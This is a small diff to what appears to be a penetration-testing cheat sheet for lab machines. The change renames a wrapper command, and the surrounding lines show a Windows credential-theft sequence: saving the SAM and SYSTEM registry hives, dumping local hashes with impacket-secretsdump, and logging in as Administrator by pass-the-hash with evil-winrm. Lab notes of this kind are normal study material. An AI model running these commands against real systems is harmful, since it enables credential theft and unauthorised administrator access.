@@ -80,8 +80,8 @@ cron.
 reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv     # needs SeBackup or admin
 ```
 ```bash
-htb x "impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL"
-htb x "evil-winrm -i $T -u Administrator -H <nthash>"        # pass-the-hash
+pwnloop x "impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL"
+pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"        # pass-the-hash
 ```
 
 ## Backstop
